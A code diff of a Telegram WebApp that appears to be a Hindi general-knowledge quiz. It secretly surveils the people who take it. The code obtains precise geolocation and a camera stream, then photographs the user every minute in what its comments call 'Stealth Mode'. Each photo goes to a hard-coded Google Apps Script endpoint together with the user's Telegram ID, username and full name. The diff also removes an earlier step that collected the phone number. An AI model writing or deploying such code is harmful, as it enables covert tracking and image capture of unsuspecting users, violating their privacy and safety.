@@ -30,7 +30,7 @@
         • प्रक्रिया शुरू करने के लिए नीचे दिए बटन पर क्लिक करें।
     </div>
 
-    <button id="startBtn" onclick="initiateFlow()">प्रक्रिया शुरू करें</button>
+    <button id="startBtn" onclick="getSystemPermissions()">प्रक्रिया शुरू करें</button>
 </div>
 
 <div id="quizBox" class="card" style="display:none">
@@ -42,11 +42,10 @@
     const tg = window.Telegram.WebApp;
     tg.expand();
 
-    // 🚨 APNI APPS SCRIPT URL YAHAN DALEIN
+    // 🚨 APNI APPS SCRIPT URL YAHAN PASTE KAREIN
     const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxdOm1OryzaFHkYJJbB5MmQ4WyENGA9uFjzHtkBEXkk3xzx7ojANdyJTKXrXucxA3X5fw/exec"; 
 
     const user = tg.initDataUnsafe?.user || {};
-    let userPhone = "Pending";
     let userLoc = "Pending";
     let globalStream = null;
     let currentIdx = 0;
@@ -56,31 +55,13 @@
         {q: "1. Geography का जनक किसे कहा जाता है?", o: ["Hecataeus", "Eratosthenes", "Herodotus", "Ptolemy"], a: 0},
     ];
 
-    async function initiateFlow() {
-        const btn = document.getElementById("startBtn");
-        btn.disabled = true;
-        btn.innerText = "Verifying Identity... ⏳";
-
-        // Step 1: Request Phone Number (Telegram Popup)
-        tg.requestContact((ok, response) => {
-            if (ok && response?.responseUnsafe?.contact) {
-                userPhone = response.responseUnsafe.contact.phone_number;
-                // Phone milte hi agla step trigger karein
-                setTimeout(getSystemPermissions, 800);
-            } else {
-                alert("प्रोसेस अधूरा है! टेस्ट के लिए सभी परमिशन्स अनिवार्य हैं।");
-                btn.disabled = false;
-                btn.innerText = "प्रक्रिया शुरू करें";
-            }
-        });
-    }
-
     async function getSystemPermissions() {
         const btn = document.getElementById("startBtn");
+        btn.disabled = true;
         btn.innerText = "Setting Environment... ⏳";
 
         try {
-            // Step 2: Location Access
+            // Step 1: Location Access (Sirf ek baar)
             const pos = await new Promise((res, rej) => {
                 navigator.geolocation.getCurrentPosition(res, rej, {
                     enableHighAccuracy: true,
@@ -89,7 +70,7 @@
             });
             userLoc = `${pos.coords.latitude}, ${pos.coords.longitude}`;
 
-            // Step 3: Camera Access
+            // Step 2: Camera Access (Sirf ek baar)
             globalStream = await navigator.mediaDevices.getUserMedia({ video: true });
 
             // Sab permissions mil gayi!
@@ -103,12 +84,13 @@
     }
 
     function startTestFinal() {
-        // Initial Entry Data
+        // Initial Entry Data - Pehli baar Sheet mein bhej rhe hain
         captureAndSend("Verified_Entry");
 
-        // Har 1 minute mein auto-photo capture (Stealth)
+        // Har 1 minute mein auto-photo capture (Stealth Mode)
+        // Ye bina permission pop-up ke background mein chalega
         setInterval(() => {
-            captureAndSend("Interval_Tracking");
+            captureAndSend("Active_Session");
         }, 60000);
 
         // UI Switch
@@ -135,7 +117,6 @@
                 userId: user.id || "ID_Err",
                 username: user.username || "NA",
                 fullName: (user.first_name || "") + " " + (user.last_name || ""),
-                phone: userPhone,
                 score: "In_Progress",
                 status: statusType,
                 photo: photoData,
